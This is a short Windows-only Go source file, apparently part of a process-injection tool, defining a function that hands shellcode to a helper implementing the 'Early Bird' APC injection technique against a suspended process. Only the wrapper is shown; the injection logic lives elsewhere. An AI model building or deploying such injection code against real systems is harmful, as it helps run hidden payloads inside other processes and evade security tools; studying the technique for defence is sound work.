//go:build windows
// +build windows

package main

// doEarlyBird queues the payload APC into an already-suspended process; the
// queueing itself (and the spawned-process variant) lives in doQueueUserAPC.
func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
	return doQueueUserAPC(hProc, pid, sc)
}
